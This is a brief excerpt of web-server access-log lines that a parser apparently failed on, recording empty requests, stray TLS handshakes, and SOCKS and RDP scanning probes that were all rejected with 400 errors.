421@@205.185.124.100 - - [26/Nov/2021:07:05:10 +0000] "" 400 0 "-" "-"@@list index out of range
481@@27.115.124.106 - - [26/Nov/2021:09:06:05 +0000] "\x16\x03\x01\x00\xB2\x01\x00\x00\xAE\x03\x03TsV\xD3\x88\xC9" 400 166 "-" "-"@@list index out of range
717@@5.188.210.227 - - [26/Nov/2021:17:23:29 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
718@@5.188.210.227 - - [26/Nov/2021:17:25:16 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
748@@34.77.162.27 - - [26/Nov/2021:19:43:17 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03\xB0\xDE\x0F\xCE6\xD5R\xCFR\xE7\x88g\x91\xBAm\xDC\xE3\x98a\xE9\xD02i\x11\xD2\xCF\x04\xE6\xE6\xDB$\xD2\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
749@@94.232.43.63 - - [26/Nov/2021:19:46:59 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
750@@94.232.43.63 - - [26/Nov/2021:19:46:59 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
762@@71.6.158.166 - - [26/Nov/2021:20:36:59 +0000] "" 400 0 "-" "-"@@list index out of range
763@@71.6.158.166 - - [26/Nov/2021:20:37:00 +0000] "" 400 0 "-" "-"@@list index out of range
764@@71.6.158.166 - - [26/Nov/2021:20:37:01 +0000] "" 400 0 "-" "-"@@list index out of range
